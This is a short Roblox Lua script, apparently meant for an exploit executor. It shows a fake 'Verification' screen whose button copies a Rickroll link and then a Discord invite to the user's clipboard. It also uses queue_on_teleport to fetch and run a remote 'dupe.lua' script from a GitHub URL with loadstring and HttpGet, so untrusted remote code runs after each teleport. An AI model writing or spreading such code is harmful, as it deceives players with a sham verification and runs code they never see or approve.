local copy = game.Players.LocalPlayer.PlayerGui:WaitForChild("Verification").Verefy.VerefyButton.Code.CopyCode
local verifybutton = game.Players.LocalPlayer.PlayerGui:WaitForChild("Verification").Verefy.VerefyButton
local event = game.Players.LocalPlayer.PlayerGui:WaitForChild("Verification").Verefy.Event
local code = game.Players.LocalPlayer.PlayerGui:WaitForChild("Verification").Verefy.code

local reallink = false

local link1 = "youtube.com/watch?v=dQw4w9WgXcQ"
local link2 = "discord.gg/Xt2V7rVG4w"

copy.MouseButton1Click:Connect(function()
	setclipboard(code.Value)
end)

verifybutton.MouseButton1Click:Connect(function()
	if reallink == false then
		setclipboard(link1)
		reallink = true
	else
		setclipboard(link2)
	end
end)

event:FireServer(true)

queue_on_teleport([[
    repeat wait() until game:IsLoaded()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/qwertyu4t55567rgdf/fling/refs/heads/main/dupe.lua"))()
]])
